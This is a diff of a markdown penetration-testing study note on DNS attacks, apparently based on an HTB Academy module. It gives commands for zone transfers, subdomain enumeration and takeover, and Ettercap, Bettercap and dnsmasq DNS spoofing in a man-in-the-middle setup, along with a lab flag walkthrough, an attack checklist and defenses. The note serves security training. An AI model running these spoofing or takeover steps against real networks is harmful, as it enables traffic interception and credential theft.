@@ -1,4 +1,4 @@
-# 🔓 DNS (Domain Name System) Attacks
+# 🔓 DNS Attacks
 
 ## 🎯 Overview
 
@@ -9,22 +9,25 @@ This document covers **exploitation techniques** against DNS services, focusing 
 ## 🏗️ DNS Attack Methodology
 
 ### Attack Chain Overview
+
 ```
 Service Discovery → Zone Transfer Exploitation → Subdomain Enumeration → Domain Takeover → DNS Spoofing
 ```
 
 ### Key Attack Objectives
-- **DNS zone transfers** for information gathering
-- **Subdomain enumeration** to expand attack surface
-- **Domain/subdomain takeover** for content control
-- **DNS cache poisoning** for traffic redirection
-- **DNS spoofing** for man-in-the-middle attacks
 
----
+* **DNS zone transfers** for information gathering
+* **Subdomain enumeration** to expand attack surface
+* **Domain/subdomain takeover** for content control
+* **DNS cache poisoning** for traffic redirection
+* **DNS spoofing** for man-in-the-middle attacks
+
+***
 
 ## 📍 Service Discovery & Enumeration
 
 ### Default DNS Port Detection
+
 ```bash
 # Default DNS ports: UDP/53, TCP/53
 # HTB Academy enumeration example
@@ -36,6 +39,7 @@ PORT    STATE  SERVICE     VERSION
 ```
 
 ### Comprehensive DNS Scanning
+
 ```bash
 # Full DNS service enumeration
 nmap -p53 -sU -sV --script dns-* 10.10.110.213
@@ -48,17 +52,19 @@ nmap -p53 --script dns-recursion 10.10.110.213
 ```
 
 ### Key Information to Extract
-- **DNS server software** (BIND, Microsoft DNS, etc.)
-- **Version information** for vulnerability research
-- **Zone information** (SOA records)
-- **Recursion capabilities**
-- **DNS security features** (DNSSEC status)
 
----
+* **DNS server software** (BIND, Microsoft DNS, etc.)
+* **Version information** for vulnerability research
+* **Zone information** (SOA records)
+* **Recursion capabilities**
+* **DNS security features** (DNSSEC status)
+
+***
 
 ## 🗄️ DNS Zone Transfer Attacks
 
 ### Understanding Zone Transfers
+
 ```
 DNS Zone Transfer = Copy of DNS database from one server to another
 Default behavior: No authentication required
@@ -69,6 +75,7 @@ Protocol: Uses TCP/53 for reliable transmission
 ### HTB Academy Zone Transfer Example
 
 #### Using DIG for AXFR
+
 ```bash
 # HTB Academy zone transfer attack
 dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
@@ -91,6 +98,7 @@ inlanefrieght.htb.         604800  IN      SOA     localhost. root.localhost. 2 
 ```
 
 #### Alternative Zone Transfer Methods
+
 ```bash
 # Using nslookup
 nslookup
@@ -106,6 +114,7 @@ dnsrecon -d inlanefreight.htb -t axfr
 ```
 
 ### Fierce for Comprehensive DNS Analysis
+
 ```bash
 # HTB Academy Fierce example
 fierce --domain zonetransfer.me
@@ -131,13 +140,14 @@ Zone: success
                    'email 7200 IN A 74.125.206.26',
 ```
 
----
+***
 
 ## 🔍 Subdomain Enumeration & Domain Takeover
 
 ### Subdomain Discovery Techniques
 
 #### HTB Academy Subfinder Example
+
 ```bash
 # Subdomain enumeration with Subfinder
 ./subfinder -d inlanefreight.com -v
@@ -158,6 +168,7 @@ ____  _| |__ / _(_)_ _  __| |___ _ _
 ```
 
 #### Subbrute for Internal Networks
+
 ```bash
 # HTB Academy Subbrute setup for internal use
 git clone https://github.com/TheRook/subbrute.git
@@ -179,6 +190,7 @@ support.inlanefreight.com
 ### Domain Takeover Attacks
 
 #### Understanding Subdomain Takeover
+
 ```
 CNAME Record: sub.target.com → anotherdomain.com
 Risk: If anotherdomain.com expires and is re-registered
@@ -187,6 +199,7 @@ Common Targets: AWS S3, GitHub Pages, Heroku, Fastly
 ```
 
 #### HTB Academy Takeover Example
+
 ```bash
 # Check for vulnerable CNAME records
 host support.inlanefreight.com
@@ -205,6 +218,7 @@ curl https://support.inlanefreight.com
 ```
 
 #### Subdomain Takeover Detection Tools
+
 ```bash
 # Using SubOver
 python3 subover.py -l subdomains.txt
@@ -220,11 +234,12 @@ python3 subover.py -l subdomains.txt
 # - Fastly CDN
 ```
 
----
+***
 
 ## 🕷️ DNS Spoofing & Cache Poisoning
 
 ### Understanding DNS Cache Poisoning
+
 ```
 Goal: Alter legitimate DNS records with false information
 Methods: 
@@ -237,6 +252,7 @@ Result: Traffic redirection to malicious servers
 ### HTB Academy Ettercap DNS Spoofing
 
 #### Step 1: Configure DNS Spoofing
+
 ```bash
 # Edit Ettercap DNS configuration
 cat /etc/ettercap/etter.dns
@@ -247,6 +263,7 @@ inlanefreight.com      A   192.168.225.110
 ```
 
 #### Step 2: Execute MITM Attack
+
 ```bash
 # Launch Ettercap GUI
 ettercap -G
@@ -259,6 +276,7 @@ ettercap -G
 ```
 
 #### Step 3: Verify DNS Spoofing
+
 ```cmd
 # From victim machine (192.168.152.129)
 C:\>ping inlanefreight.com
@@ -271,6 +289,7 @@ Reply from 192.168.225.110: bytes=32 time<1ms TTL=64
 ```
 
 ### Alternative DNS Spoofing Tools
+
 ```bash
 # Using Bettercap
 bettercap -iface eth0
@@ -286,16 +305,18 @@ echo "192.168.225.110 inlanefreight.com" >> /etc/dnsmasq_spoof.conf
 dnsmasq --conf-file=/etc/dnsmasq_spoof.conf
 ```
 
----
+***
 
 ## 🎯 HTB Academy Lab Scenarios
 
 ### Scenario 1: DNS Zone Transfer Exploitation
+
 **Task**: Find all DNS records for "inlanefreight.htb" domain and submit flag found as DNS record
 
 #### HTB Academy Solution Workflow
 
-##### Step 1: Setup Subbrute Tool
+**Step 1: Setup Subbrute Tool**
+
 ```bash
 # Clone subbrute repository
 git clone https://github.com/TheRook/subbrute.git && cd subbrute/
@@ -308,7 +329,8 @@ Receiving objects: 100% (438/438), 11.85 MiB | 20.67 MiB/s, done.
 Resolving deltas: 100% (216/216), done.
 ```
 
-##### Step 2: Configure DNS Resolver
+**Step 2: Configure DNS Resolver**
+
 ```bash
 # Add target DNS server IP to resolvers file
 echo STMIP > resolvers.txt
@@ -316,7 +338,8 @@ echo STMIP > resolvers.txt
 # Replace STMIP with actual target IP (e.g., 10.129.137.154)
 ```
 
-##### Step 3: Subdomain Enumeration
+**Step 3: Subdomain Enumeration**
+
 ```bash
 # Use subbrute with SecLists wordlist
 python3 subbrute.py inlanefreight.htb -s /opt/useful/SecLists/Discovery/DNS/namelist.txt -r resolvers.txt
@@ -329,7 +352,8 @@ hr.inlanefreight.htb
 ns.inlanefreight.htb
 ```
 
-##### Step 4: Zone Transfer on Discovered Subdomains
+**Step 4: Zone Transfer on Discovered Subdomains**
+
 ```bash
 # Perform zone transfer on hr subdomain and search for TXT records
 dig axfr hr.inlanefreight.htb @10.129.137.154 | grep "TXT"
@@ -339,6 +363,7 @@ hr.inlanefreight.htb.	604800	IN	TXT	"HTB{...}"
 ```
 
 #### Alternative Methods
+
 ```bash
 # Method 1: Direct zone transfer
 dig AXFR @target_dns_server inlanefreight.htb
@@ -357,6 +382,7 @@ done
 ```
 
 ### Advanced DNS Reconnaissance
+
 ```bash
 # Enumerate all record types
 dig ANY @target_dns_server inlanefreight.htb
@@ -376,83 +402,90 @@ for sub in $(cat discovered_subdomains.txt); do
 done
 ```
 
----
+***
 
 ## 📋 DNS Attack Checklist
 
 ### Discovery & Enumeration
-- [ ] **Port scanning** - UDP/53 and TCP/53 detection
-- [ ] **Version enumeration** - DNS server software identification
-- [ ] **Zone transfer testing** - AXFR query attempts
-- [ ] **Recursion testing** - DNS resolver configuration
-- [ ] **DNSSEC validation** - Security feature assessment
+
+* [ ] **Port scanning** - UDP/53 and TCP/53 detection
+* [ ] **Version enumeration** - DNS server software identification
+* [ ] **Zone transfer testing** - AXFR query attempts
+* [ ] **Recursion testing** - DNS resolver configuration
+* [ ] **DNSSEC validation** - Security feature assessment
 
 ### Information Gathering
-- [ ] **Subdomain enumeration** - Subfinder, Subbrute, Gobuster
-- [ ] **DNS record analysis** - A, AAAA, CNAME, MX, TXT, NS records
-- [ ] **Reverse DNS lookup** - PTR record enumeration
-- [ ] **DNS cache snooping** - Cached record identification
-- [ ] **DNS walking** - NSEC record exploitation
+
+* [ ] **Subdomain enumeration** - Subfinder, Subbrute, Gobuster
+* [ ] **DNS record analysis** - A, AAAA, CNAME, MX, TXT, NS records
+* [ ] **Reverse DNS lookup** - PTR record enumeration
+* [ ] **DNS cache snooping** - Cached record identification
+* [ ] **DNS walking** - NSEC record exploitation
 
 ### Exploitation Techniques
-- [ ] **Zone transfer exploitation** - Complete DNS data extraction
-- [ ] **Subdomain takeover** - CNAME record vulnerability assessment
-- [ ] **DNS cache poisoning** - MITM attack implementation
-- [ ] **DNS tunneling** - Covert channel establishment
-- [ ] **DNS amplification** - DDoS attack potential
+
+* [ ] **Zone transfer exploitation** - Complete DNS data extraction
+* [ ] **Subdomain takeover** - CNAME record vulnerability assessment
+* [ ] **DNS cache poisoning** - MITM attack implementation
+* [ ] **DNS tunneling** - Covert channel establishment
+* [ ] **DNS amplification** - DDoS attack potential
 
 ### Post-Exploitation
-- [ ] **Traffic monitoring** - DNS query analysis
-- [ ] **Persistent spoofing** - Long-term redirection
-- [ ] **Credential harvesting** - Fake login page hosting
-- [ ] **Lateral movement** - Internal DNS server targeting
 
----
+* [ ] **Traffic monitoring** - DNS query analysis
+* [ ] **Persistent spoofing** - Long-term redirection
+* [ ] **Credential harvesting** - Fake login page hosting
+* [ ] **Lateral movement** - Internal DNS server targeting
+
+***
 
 ## 🛡️ Defense & Mitigation
 
 ### DNS Server Hardening
-- **Disable zone transfers** - Restrict AXFR to authorized servers only
-- **Enable DNSSEC** - Cryptographic DNS response validation
-- **Implement access controls** - IP-based query restrictions
-- **Regular updates** - Patch DNS server software
-- **Rate limiting** - Prevent DNS amplification attacks
+
+* **Disable zone transfers** - Restrict AXFR to authorized servers only
+* **Enable DNSSEC** - Cryptographic DNS response validation
+* **Implement access controls** - IP-based query restrictions
+* **Regular updates** - Patch DNS server software
+* **Rate limiting** - Prevent DNS amplification attacks
 
 ### Network Security
-- **DNS filtering** - Block malicious domains
-- **Encrypted DNS** - DNS over HTTPS (DoH) or DNS over TLS (DoT)
-- **Split DNS** - Separate internal and external DNS
-- **DNS monitoring** - Unusual query pattern detection
-- **Cache poisoning protection** - Source port randomization
+
+* **DNS filtering** - Block malicious domains
+* **Encrypted DNS** - DNS over HTTPS (DoH) or DNS over TLS (DoT)
+* **Split DNS** - Separate internal and external DNS
+* **DNS monitoring** - Unusual query pattern detection
+* **Cache poisoning protection** - Source port randomization
 
 ### Monitoring & Detection
-- **Zone transfer attempts** - Log AXFR queries
-- **Unusual DNS queries** - Detect reconnaissance patterns
-- **DNS response validation** - Monitor for spoofed responses
-- **Subdomain monitoring** - Track new subdomain creation
-- **Certificate transparency** - Monitor SSL certificate logs
 
----
+* **Zone transfer attempts** - Log AXFR queries
+* **Unusual DNS queries** - Detect reconnaissance patterns
+* **DNS response validation** - Monitor for spoofed responses
+* **Subdomain monitoring** - Track new subdomain creation
+* **Certificate transparency** - Monitor SSL certificate logs
+
+***
 
 ## 🔗 Related Techniques
 
-- **[Subdomain Enumeration](../services/dns-enumeration.md)** - Information gathering techniques
-- **[Domain Hijacking](../web-enumeration/domain-attacks.md)** - Web-based domain attacks
-- **[Man-in-the-Middle](../network-attacks/mitm-attacks.md)** - Traffic interception
-- **[Social Engineering](../social-engineering/)** - Phishing with spoofed domains
-- **[Network Pivoting](../network-attacks/pivoting.md)** - Internal network access
+* [**Subdomain Enumeration**](https://github.com/sco-sec/CPTS-PREP-NOTES/blob/main/services/dns-enumeration.md) - Information gathering techniques
+* [**Domain Hijacking**](https://github.com/sco-sec/CPTS-PREP-NOTES/blob/main/web-enumeration/domain-attacks.md) - Web-based domain attacks
+* [**Man-in-the-Middle**](https://github.com/sco-sec/CPTS-PREP-NOTES/blob/main/network-attacks/mitm-attacks.md) - Traffic interception
+* [**Social Engineering**](https://github.com/sco-sec/CPTS-PREP-NOTES/blob/main/social-engineering/README.md) - Phishing with spoofed domains
+* [**Network Pivoting**](https://github.com/sco-sec/CPTS-PREP-NOTES/blob/main/network-attacks/pivoting.md) - Internal network access
 
----
+***
 
 ## 📚 References
 
-- **HTB Academy** - Attacking Common Services Module
-- **RFC 1035** - Domain Names Implementation and Specification
-- **OWASP DNS Security** - DNS attack vectors and mitigations
-- **Subfinder Documentation** - Subdomain discovery tool
-- **Ettercap Manual** - MITM attack framework
-- **can-i-take-over-xyz** - Subdomain takeover reference
+* **HTB Academy** - Attacking Common Services Module
+* **RFC 1035** - Domain Names Implementation and Specification
+* **OWASP DNS Security** - DNS attack vectors and mitigations
+* **Subfinder Documentation** - Subdomain discovery tool
+* **Ettercap Manual** - MITM attack framework
+* **can-i-take-over-xyz** - Subdomain takeover reference
 
----
+***
 
-*This document provides comprehensive DNS attack methodologies based on HTB Academy's "Attacking Common Services" module, focusing on practical exploitation techniques for penetration testing and security assessment.* 
+_This document provides comprehensive DNS attack methodologies based on HTB Academy's "Attacking Common Services" module, focusing on practical exploitation techniques for penetration testing and security assessment._
